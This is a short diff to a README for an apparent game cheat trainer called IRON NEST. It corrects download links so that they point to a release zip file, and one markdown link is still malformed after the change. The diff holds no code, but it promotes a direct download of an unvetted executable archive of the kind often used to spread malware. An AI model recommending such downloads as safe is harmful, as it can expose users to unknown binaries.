@@ -9,9 +9,9 @@
 [![Downloads](https://img.shields.io/github/downloads/FlintDelivererTube/IRON-NEST-Trainer/total)](https://github.com/FlintDelivererTube/IRON-NEST-Trainer/releases)
 [![License](https://img.shields.io/badge/license-MIT-e0c060)](LICENSE)
 
-> **[⬇ Download the latest IRON NEST trainer](https://github.com/[YOUR-USERNAME/iron-nest-trainer](https://github.com/FlintDelivererTube/IRON-NEST-Trainer)/releases/latest)**
+> **[⬇ Download the latest IRON NEST trainer](https://github.com/[FlintDelivererTube/IRON-NEST-Trainer](https://github.com/FlintDelivererTube/IRON-NEST-Trainer/releases/latest)**
 <p align="center">
-    <a href="https://github.com/Crushflalead/FlintDelivererTube/IRON-NEST-Trainer/releases/latest/download/IRONNESTtrainer.zip">
+    <a href="https://github.com/FlintDelivererTube/IRON-NEST-Trainer/releases/latest/download/IRONNESTtrainer.zip">
         <img src="assets/banner1.png" width="100%" alt="Download IRON NEST Trainer">
     </a>
 </p>
